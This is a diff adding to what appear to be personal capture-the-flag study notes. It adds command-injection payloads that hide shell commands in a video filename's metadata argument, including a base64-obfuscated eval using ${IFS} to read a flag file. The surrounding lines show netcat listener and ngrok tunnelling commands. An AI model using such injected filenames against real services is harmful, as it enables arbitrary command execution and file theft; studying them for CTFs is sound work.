@@ -42,6 +42,21 @@ netat::::
 nc -nlvp 8080 (no dns lookup listen_mode verbose_mode port_specify
 ngrok http/tcp port_number
 ```
+## command injection
+```
+tes2.mp4 -metadaata title=$(cat /flag.txt).mp4
+file-small.mp4${IFS}-metadata${IFS}title=$(eval${IFS}$echo${IFS}Y2F0IGZsYWcudHh0Cg==
+in bash we can write
+test_cmd="ls"
+eval $test_cmd
+```
+## bash
+```
+ls non_existent_directory
+echo "Exit status: $?"
+role of $? holds the return value of most recently executed commadn (if all is well return value is 0)
+```
+
 ## base 64
 ```
 base64 filename
